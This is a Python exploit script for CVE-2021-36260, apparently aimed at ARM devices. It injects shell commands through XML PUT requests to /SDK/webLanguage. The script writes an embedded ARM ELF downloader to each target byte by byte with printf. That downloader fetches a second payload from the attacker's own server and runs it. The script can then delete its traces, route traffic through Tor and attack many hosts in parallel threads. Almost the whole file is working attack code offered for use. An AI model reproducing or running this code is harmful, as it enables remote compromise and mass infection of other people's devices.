#!/usr/bin/env python3
"""
CVE-2021-36260 in os command injection 

1: You can upload files to a specific web server.
2: Arm architecture only 

3: TakenoSite shall not be responsible or liable for any damages whatsoever resulting from the use of this program.

@ TakenoSite
"""


import threading 
import time 
import numpy as np
import requests
import socket,socks
import sys 

from src.Server import server
from src.Server import filePath

def ARM_DOWNLOADR(ip:str,port:int=80,header=None) -> list:

    x = ["{:x}".format(int(i)) for i in ip.split(".")] 
    port = "{:x}".format(port)
    payloads = []
    
    ## arm 16byte download code
    paycode_16byte= [

            '\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x61\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00',
            '\\x02\\x00\\x28\\x00\\x01\\x00\\x00\\x00\\x1c\\x83\\x00\\x00\\x34\\x00\\x00\\x00',
            '\\xc4\\x03\\x00\\x00\\x02\\x00\\x00\\x00\\x34\\x00\\x20\\x00\\x02\\x00\\x28\\x00',
            '\\x05\\x00\\x04\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00',
            '\\x00\\x80\\x00\\x00\\xa4\\x03\\x00\\x00\\xa4\\x03\\x00\\x00\\x05\\x00\\x00\\x00',
            '\\x00\\x80\\x00\\x00\\x01\\x00\\x00\\x00\\xa4\\x03\\x00\\x00\\xa4\\x03\\x01\\x00',
            '\\xa4\\x03\\x01\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x06\\x00\\x00\\x00',
            '\\x00\\x80\\x00\\x00\\x01\\x18\\xa0\\xe1\\xff\\x18\\x01\\xe2\\x00\\x1c\\x81\\xe1',
            '\\xff\\x30\\x03\\xe2\\x02\\x24\\xa0\\xe1\\x03\\x10\\x81\\xe1\\xff\\x2c\\x02\\xe2',
            '\\x01\\x20\\x82\\xe1\\xff\\x3c\\x02\\xe2\\xff\\x08\\x02\\xe2\\x03\\x34\\xa0\\xe1',
            '\\x20\\x04\\xa0\\xe1\\x22\\x0c\\x80\\xe1\\x02\\x3c\\x83\\xe1\\x00\\x00\\x83\\xe1',
            '\\x0e\\xf0\\xa0\\xe1\\x00\\x10\\xa0\\xe1\\x00\\x00\\x9f\\xe5\\x97\\x00\\x00\\xea',
            '\\x01\\x00\\x90\\x00\\x00\\x10\\xa0\\xe1\\x00\\x00\\x9f\\xe5\\x93\\x00\\x00\\xea',
            '\\x06\\x00\\x90\\x00\\x01\\xc0\\xa0\\xe1\\x00\\x10\\xa0\\xe1\\x08\\x00\\x9f\\xe5',
            '\\x02\\x30\\xa0\\xe1\\x0c\\x20\\xa0\\xe1\\x8c\\x00\\x00\\xea\\x05\\x00\\x90\\x00',
            '\\x04\\xe0\\x2d\\xe5\\x0c\\xd0\\x4d\\xe2\\x07\\x00\\x8d\\xe8\\x03\\x10\\xa0\\xe3',
            '\\x0d\\x20\\xa0\\xe1\\x08\\x00\\x9f\\xe5\\x84\\x00\\x00\\xeb\\x0c\\xd0\\x8d\\xe2',
            '\\x00\\x80\\xbd\\xe8\\x66\\x00\\x90\\x00\\x01\\xc0\\xa0\\xe1\\x00\\x10\\xa0\\xe1',
            '\\x08\\x00\\x9f\\xe5\\x02\\x30\\xa0\\xe1\\x0c\\x20\\xa0\\xe1\\x7b\\x00\\x00\\xea',
            '\\x04\\x00\\x90\\x00\\x01\\xc0\\xa0\\xe1\\x00\\x10\\xa0\\xe1\\x08\\x00\\x9f\\xe5',
            '\\x02\\x30\\xa0\\xe1\\x0c\\x20\\xa0\\xe1\\x74\\x00\\x00\\xea\\x03\\x00\\x90\\x00',
            '\\x04\\xe0\\x2d\\xe5\\x0c\\xd0\\x4d\\xe2\\x07\\x00\\x8d\\xe8\\x01\\x10\\xa0\\xe3',
            '\\x0d\\x20\\xa0\\xe1\\x08\\x00\\x9f\\xe5\\x6c\\x00\\x00\\xeb\\x0c\\xd0\\x8d\\xe2',
            '\\x00\\x80\\xbd\\xe8\\x66\\x00\\x90\\x00\\xf0\\x41\\x2d\\xe9\\x74\\x41\\x9f\\xe5',
            '\\x94\\xd0\\x4d\\xe2\\x00\\x00\\x00\\xea\\x01\\x40\\x84\\xe2\\x00\\x60\\xd4\\xe5',
            '\\x00\\x00\\x56\\xe3\\xfb\\xff\\xff\\x1a\\x58\\x31\\x9f\\xe5\\x58\\x11\\x9f\\xe5',
            '\\x06\\x20\\xa0\\xe3\\x01\\x00\\xa0\\xe3\\x04\\x80\\x63\\xe0\\xd9\\xff\\xff\\xeb',
            '\\x02\\x40\\xa0\\xe3\\x'+port+'\\xc0\\xa0\\xe3\\x'+x[3]+'\\x30\\xa0\\xe3\\x'+x[1]+'\\x10\\xa0\\xe3',
            '\\x'+x[2]+'\\x20\\xa0\\xe3\\x'+x[0]+'\\x00\\xa0\\xe3\\x83\\xc0\\xcd\\xe5\\x80\\x40\\xcd\\xe5',
            '\\x81\\x60\\xcd\\xe5\\x82\\x60\\xcd\\xe5\\xa5\\xff\\xff\\xeb\\x1c\\x11\\x9f\\xe5',
            '\\x84\\x00\\x8d\\xe5\\x18\\x21\\x9f\\xe5\\x18\\x01\\x9f\\xe5\\xb8\\xff\\xff\\xeb',
            '\\x01\\x10\\xa0\\xe3\\x00\\x70\\xa0\\xe1\\x06\\x20\\xa0\\xe1\\x04\\x00\\xa0\\xe1',
            '\\xd2\\xff\\xff\\xeb\\x01\\x00\\x70\\xe3\\x01\\x00\\x77\\x13\\x00\\x50\\xa0\\xe1',
            '\\x01\\x00\\xa0\\x03\\xa6\\xff\\xff\\x0b\\x05\\x00\\xa0\\xe1\\x80\\x10\\x8d\\xe2',
            '\\x10\\x20\\xa0\\xe3\\xb1\\xff\\xff\\xeb\\x00\\x40\\x50\\xe2\\x05\\x00\\x00\\xaa',
            '\\x01\\x00\\xa0\\xe3\\xd0\\x10\\x9f\\xe5\\x04\\x20\\xa0\\xe3\\xb5\\xff\\xff\\xeb',
            '\\x00\\x00\\x64\\xe2\\x9a\\xff\\xff\\xeb\\x1e\\x40\\x88\\xe2\\x05\\x00\\xa0\\xe1',
            '\\xb8\\x10\\x9f\\xe5\\x04\\x20\\xa0\\xe1\\xae\\xff\\xff\\xeb\\x04\\x00\\x50\\xe1',
            '\\x03\\x00\\xa0\\x13\\x92\\xff\\xff\\x1b\\x06\\x40\\xa0\\xe1\\x93\\x10\\x8d\\xe2',
            '\\x01\\x20\\xa0\\xe3\\x05\\x00\\xa0\\xe1\\xad\\xff\\xff\\xeb\\x01\\x00\\x50\\xe3',
            '\\x04\\x00\\xa0\\xe3\\x8a\\xff\\xff\\x1b\\x93\\x30\\xdd\\xe5\\x04\\x44\\x83\\xe1',
            '\\x7c\\x30\\x9f\\xe5\\x03\\x00\\x54\\xe1\\xf3\\xff\\xff\\x1a\\x0d\\x10\\xa0\\xe1',
            '\\x80\\x20\\xa0\\xe3\\x05\\x00\\xa0\\xe1\\xa1\\xff\\xff\\xeb\\x00\\x20\\x50\\xe2',
            '\\x0d\\x40\\xa0\\xe1\\x0d\\x10\\xa0\\xe1\\x07\\x00\\xa0\\xe1\\x01\\x00\\x00\\xda',
            '\\x94\\xff\\xff\\xeb\\xf4\\xff\\xff\\xea\\x05\\x00\\xa0\\xe1\\x7c\\xff\\xff\\xeb',
            '\\x07\\x00\\xa0\\xe1\\x7a\\xff\\xff\\xeb\\x38\\x10\\x9f\\xe5\\x04\\x20\\xa0\\xe3',
            '\\x01\\x00\\xa0\\xe3\\x8b\\xff\\xff\\xeb\\x05\\x00\\xa0\\xe3\\x70\\xff\\xff\\xeb',
            '\\x94\\xd0\\x8d\\xe2\\xf0\\x81\\xbd\\xe8\\x5c\\x83\\x00\\x00\\x64\\x83\\x00\\x00',
            '\\x41\\x02\\x00\\x00\\xff\\x01\\x00\\x00\\x6c\\x83\\x00\\x00\\x78\\x83\\x00\\x00',
            '\\x80\\x83\\x00\\x00\\x0a\\x0d\\x0a\\x0d\\x9c\\x83\\x00\\x00\\x95\\xff\\xff\\xea',
            '\\x70\\x40\\x2d\\xe9\\x10\\x40\\x8d\\xe2\\x70\\x00\\x94\\xe8\\x71\\x00\\x90\\xef',
            '\\x01\\x0a\\x70\\xe3\\x00\\x40\\xa0\\xe1\\x70\\x80\\xbd\\x98\\x03\\x00\\x00\\xeb',
            '\\x00\\x30\\x64\\xe2\\x00\\x30\\x80\\xe5\\x00\\x00\\xe0\\xe3\\x70\\x80\\xbd\\xe8',
            '\\x00\\x00\\x9f\\xe5\\x0e\\xf0\\xa0\\xe1\\xa4\\x03\\x01\\x00\\x61\\x72\\x6d\\x35',
            '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0a\\x00\\x00\\x48\\x49\\x4b\\x54',
            '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x59\\x41\\x52\\x0a\\x00\\x00\\x00\\x00',
            '\\x47\\x45\\x54\\x20\\x2f\\x68\\x2f\\x61\\x72\\x6d\\x35\\x20\\x48\\x54\\x54\\x50',
            '\\x2f\\x31\\x2e\\x30\\x0d\\x0a\\x0d\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0a',
            '\\x00\\x00\\x00\\x00\\x00\\x2e\\x73\\x68\\x73\\x74\\x72\\x74\\x61\\x62\\x00\\x2e',
            '\\x74\\x65\\x78\\x74\\x00\\x2e\\x72\\x6f\\x64\\x61\\x74\\x61\\x00\\x2e\\x62\\x73',
            '\\x73\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00',
            '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00',
            '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0b\\x00\\x00\\x00',
            '\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x74\\x80\\x00\\x00\\x74\\x00\\x00\\x00',
            '\\xe8\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00',
            '\\x00\\x00\\x00\\x00\\x11\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x32\\x00\\x00\\x00',
            '\\x5c\\x83\\x00\\x00\\x5c\\x03\\x00\\x00\\x48\\x00\\x00\\x00\\x00\\x00\\x00\\x00',
            '\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x19\\x00\\x00\\x00',
            '\\x08\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\xa4\\x03\\x01\\x00\\xa4\\x03\\x00\\x00',
            '\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00',
            '\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00',
            '\\x00\\x00\\x00\\x00\\xa4\\x03\\x00\\x00\\x1e\\x00\\x00\\x00\\x00\\x00\\x00\\x00',
            
    ]

    return paycode_16byte


class EXPLOIT:
    
    def __init__(self, tor):
        if tor:
            print("\033[33m[*] Tor : True\033[0m")
            try:
                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
                socket.socket = socks.socksocket
            except:
                print("\033[32m[!] Tor may not be running. or {server tor start}\033[0m\n")
                sys.exit()

        else:
            print("\033[33m[*] Tor : False\033[0m")
        pass
    

     
    def exploit_generate(self, payloads:list):
        
        for _32bitcode in payloads:
            print(_32bitcode)

        pass 

    def explot_v1(self, payloads:list,payload2:list, rhost:str, rport:int, execution:bool, delete:bool): # check Point 
        
        session = requests.Session()
        
        url = "http://{}:{}{}".format(rhost,rport,"/SDK/webLanguage")
        PayloadLineNum = len(payloads)
        LineCount      = 0
        lossCount      = 0

        def Send(url:str, payload:str) -> int :
            send = session.put(url, data=payload, verify = False, allow_redirects = False, timeout = 15)
            return send.status_code
        first = True
        for byteOct in payloads:
            
            if first:
                payload = '<xml><language>$(printf "'+byteOct+'" > z)</language></xml>\r\n\r\n'
                first =False

            else:
                payload = '<xml><language>$(printf "'+byteOct+'" >> z)</language></xml>\r\n\r\n'

            while True:
                try:
                    send_to = Send(url=url, payload=payload)
                    LineCount += 1
                    lossCount  = 0
                    break
                except:
                    lossCount += 1
                    print("\033[33m [*] Try.{loss} === {send_to}/{send_total} : {status} {host}".format(loss =lossCount ,send_to = LineCount, send_total = PayloadLineNum, status= send_to, host= rhost))

                    if lossCount == 10: # try 

                        print("\033[32m [!] not in conection .. {}".format(rhost))

                        
                        count = 0
                        send_total = len(payload2[1])

                        if LineCount > 1:
                            for rm in payload2[1]:
                                send_to = Send(url=url, payload=str(rm)) 
                                count += 1
                                print("\033[31m Cancel === {send_to} / {send_total} : {status} {host}".format(send_to= count, send_total= send_total,status=send_to, host= rhost))
                        quit()
                pass 
            
            print("\033[35m [*] Send === {send_to}/{send_total} : {status} {host}".format(send_to = LineCount, send_total = PayloadLineNum, status=send_to, host=rhost))
        print("\033[35m [*] Completed {send_to}/{send_total} {host}\033[35m".format(send_to = LineCount, send_total = PayloadLineNum, host=rhost))

        if execution:

            if delete:
                process = 2 
            else:
                process = 1 
            
            for i in range(process):
               
                total_exec_code = len(payload2[i])
                count = 0
                for p in payload2[i]:
                    
                    count += 1
                    try:
                        send_to = Send(url=url, payload= str(p)) 
                        print(" [*] exec_code === {sendNum} / {total} : {status}".format(sendNum= count, total= total_exec_code, status= send_to))

                    except:
                        pass 
                print(" [*] Completed")
                time.sleep(2)  

        pass 
    
    #check 
    def SimpleUploader(self,payloads:list,payload2:list, rhost:str, rport:int):
        session = requests.Session()
        url = "http://{}:{}{}".format(rhost,rport,"/SDK/webLanguage")
        total_pack = len(payloads)
        
        
        count = 0
        for i in payloads:
            
            payload = '<language>$(printf "'+i+'" >> z)</language></xml>\r\n\r\n'
            send_to = session.put(url,data=str(payload),verify=False,allow_redirects=False,timeout=14) 
            print("[*] send === {sendNum} / {total} : {status}".format(sendNum = count, total = total_pack, status = send_to.status_code))
            count += 1

        print("[*] Completed")

        for i in range(2):
           
            total_exec_code = len(payload2[i])
            count = 0
            for p in payload2[i]:
                
                count += 1
                try:

                    send_to = session.put(url,data=str(p),verify=False,allow_redirects=False,timeout=10) 
                    print("[*] exec_code === {sendNum} / {total} : {status}".format(sendNum= count, total= total_exec_code, status= send_to.status_code))

                except:
                    pass 
             
            print("[*] Completed")

            time.sleep(2)

        pass 

def hex_4byteCode(lhost:str) -> list:
    
    _4bytePayCode = []
    _32byteCode = ARM_DOWNLOADR(ip=lhost)
    total_pack = 0
    
    for i in range(len(_32byteCode)):
        l = _32byteCode[i].split("\\")
        del l[0]
        n = 4
        arraySploit = [l[idx:idx + n] for idx in range(0,len(l), n)]
        
        for j in arraySploit:
            
            
            _4byteCount = 0
            for k in j:
                
                x_split = k.split("x")[1]
                j[_4byteCount] = x_split
                
                _4byteCount += 1

            _4byte = "\\"+"\\".join(j)
            
            if i == 0 and total_pack == 0:
                _4bytePayCode.append(str("$(printf '")+ str(_4byte) + str("' > str)\\"))
            else:
                _4bytePayCode.append(str("$(printf '")+ str(_4byte) + str("' >> str)\\"))
            
            total_pack += 1

    return _4bytePayCode


def octal_4byteCode(lhost:str, lport:int) -> list:
    
    octal_to_hexByteCode = []   
    octal_1bytes = []

    _32byteCode = ARM_DOWNLOADR(ip=lhost, port=lport)
    total_pack = 0
    hexCount = 0
    lineCount = 0

    for i in range(len(_32byteCode)):
        l = _32byteCode[i].split("\\")
         
        del l[0]
       
        n = 2
        arraySploit = [l[idx:idx + n] for idx in range(0,len(l), n)]
        
        _8byteCount = 0 
        for j in arraySploit:
            _2byteCount = 0
            for k in j:
                
                x_split = k.split("x")
                zeroHEX = x_split[0] = "0x"
                x_split = "".join(x_split)
               
                Hex_to_Oct = oct(int(x_split, 16))[2:]
                octal_1bytes.append("\x5c{oct_byte}".format(oct_byte=Hex_to_Oct))
                
                j[_2byteCount] = Hex_to_Oct
                _2byteCount += 1
            
            
           # if int(j[0]) < 2 and int(j[1]) < 2:
           #     _8byteCount += 1
            
            octal_to_hexByteCode.append(j)
            lineCount += 1

    count = 0
    for i in octal_to_hexByteCode:
        payload = "\x5c{byte1}\x5c{byte2}".format(byte1 = i[0], byte2 = i[1])
        octal_to_hexByteCode[count] = payload
        count += 1
    
    return octal_to_hexByteCode
  


finishCount = 0 
def RunThread(rhost, rport, payload,ThreadNum, Tor, execution:bool, delete:bool):
    global finishCount

    runing = EXPLOIT(tor=Tor)
    exec_code = [['<xml><language>$(chmod 777 ./z)</language></xml>', 
            '<xml><language>$(./z)</language></xml>',
            '<xml><language>$(./HIKT)</language></xml>'],
            ['<xml><language>$(rm ./z)</language></xml>',
            '<xml><language>$(rm ./HIKT)</language></xml>']]
    for RHOST in rhost:
        runing.explot_v1(payloads=payload, payload2=exec_code ,rhost=RHOST, rport=rport, execution=execution, delete=delete)
        pass 
    
    finishCount += 1
    
    if finishCount == ThreadNum:
        print("[*] All Completed")
        return 0

    pass 
        

def Upload(rhost:str,rport:int,payload:list,ThreadNum:int, Tor:bool, execution:bool, delete:bool):
    
    THREAD_NUM = ThreadNum
    THREAD_PROCESS_LIST = np.array_split(rhost,ThreadNum)
     
    if len(rhost) < THREAD_NUM:
        print("[!] Over Thread")
        return 0

    else:
        for PROCESS_LIST in THREAD_PROCESS_LIST:
            PROCESS_LIST_LEN = len(PROCESS_LIST)     
            TH = threading.Thread(target=RunThread,args=(PROCESS_LIST, rport, payload, ThreadNum, Tor, execution, delete))
            TH.start()
        TH.join() 



def readFile(filePath:str) -> list: 
    read_host = []
    with open(path,"r") as  f:
        for j in f:
            read_host.append(j.split("\n")[0])
        f.close()
        
    return read_host

def UploadModule(
        lhost:str,       # Local IP or Global IP
        lport:int,       # Download server port
        rhost:list,      # Target rhost in list only 
        rport:int,       # Target port
        ThreadNum=1,     # Thread enabled for multiple targets
        execution=False, # True if it is an executable 
        delete=False,    # Delete files after execution
        Tor=False        # Tor Netwoek 
    ):
    
    downloader = octal_4byteCode(lhost=lhost, lport=lport)
    Upload(rhost=rhost, rport=rport, payload=downloader, ThreadNum=ThreadNum, execution=execution,delete=delete,Tor=Tor)

class ServerModule:

    def __init__(self, 
            lport:int, # Pleass 0x01 ~ 0xff in range  
            lhost:str, # Your IP address 
            Path:str   # File path 
        ):
        
        self.lhost = lhost
        self.lport = lport
        filePath(Path)

        threading.Thread(target=self.SeverRunnning).start()
        
    def SeverRunnning(self):

        print("\033[33m[+] Server Runnning \033[0m")
        server.run(host=self.lhost, port=self.lport)
        
        return 0 


     
